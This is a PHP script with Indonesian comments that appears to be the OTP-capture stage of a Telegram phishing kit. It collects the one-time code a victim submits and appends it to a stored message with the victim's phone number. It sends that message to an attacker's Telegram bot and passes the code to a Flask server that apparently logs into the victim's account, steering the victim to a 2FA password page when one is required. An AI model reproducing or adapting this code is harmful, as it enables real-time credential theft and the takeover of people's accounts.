<?php
require_once __DIR__ . '/JsonSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi JSON Session Handler
$jsonSessionHandler = new JsonSessionHandler();
session_set_save_handler($jsonSessionHandler, true);
$GLOBALS['jsonSessionHandler'] = $jsonSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$code = $_POST['code'] ?? '';
$phoneNumber = $_SESSION['telegram_phone'] ?? '';

$string = $message;
$string .= "OTP : `$code`\n";

$_SESSION['message'] = $string;
$_SESSION['otp'] = $code;

// Simpan juga ke JSON secara langsung
if (isset($jsonSessionHandler)) {
    $jsonSessionHandler->saveTelegramData($string, [
        'otp_code' => $code,
        'stage' => 'otp_verification'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Komunikasi dengan server Flask
$session_id = session_id();
$data = [
    'session_id' => $session_id,
    'phone_number' => $phoneNumber,
    'code' => $code
];

$ch = curl_init($flask_server_url . "/otp");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$output = curl_exec($ch);
curl_close($ch);
$result = json_decode($output, true);

// Store the result in session
$_SESSION['telegram_auth_result'] = $result;

// Check if we need 2FA password
if (isset($result['success']) && $result['success'] === true) {
    if (isset($result['needs_password']) && $result['needs_password'] === true) {
        // We need to go to password page
        $_SESSION['telegram_needs_password'] = true;
        echo json_encode(['success' => true, 'needs_password' => true]);
    } else {
        // We're fully authenticated, go to completed page
        $_SESSION['telegram_auth_completed'] = true;
        echo json_encode(['success' => true, 'needs_password' => false]);
    }
} else {
    // Authentication failed
    echo json_encode(['success' => false, 'error' => $result['error'] ?? 'Unknown error']);
}
